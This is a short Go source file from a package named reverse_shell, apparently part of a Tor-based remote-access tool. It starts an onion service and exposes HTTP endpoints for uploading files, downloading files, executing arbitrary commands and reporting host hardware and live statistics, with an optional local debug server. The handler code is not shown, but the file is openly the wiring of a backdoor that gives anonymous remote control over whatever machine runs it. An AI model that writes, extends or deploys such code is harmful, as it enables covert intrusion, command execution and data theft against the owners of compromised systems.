package reverse_shell

import (
	"fmt"
	"net/http"
	"os"
	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor"
)

func Start() error {
	tor, err := tor.New()
	if err != nil {
		return err
	}
	HandleRestFunc(http.MethodPost, "/command/upload", handleUpload(tor))
	HandleRestFunc(http.MethodPost, "/command/download", handleDownload(tor))
	HandleRestFunc(http.MethodPost, "/command/exec", handleCommand(tor))
	HandleRestFunc(http.MethodGet, "/stats/hardware", handleHardwareStats(tor))
	HandleRestFunc(http.MethodGet, "/stats/live", handleLiveStats(tor))
	fmt.Printf("starting onion at http://%s.onion\n", tor.Onion.ID)
	if os.Getenv("DEBUG") != "" {
		go http.Serve(tor.Onion, http.DefaultServeMux)
		fmt.Printf("starting debug server on http://127.0.0.1:3000\n")
		return http.ListenAndServe("127.0.0.1:3000", http.DefaultServeMux)
	}
	return http.Serve(tor.Onion, http.DefaultServeMux)
}
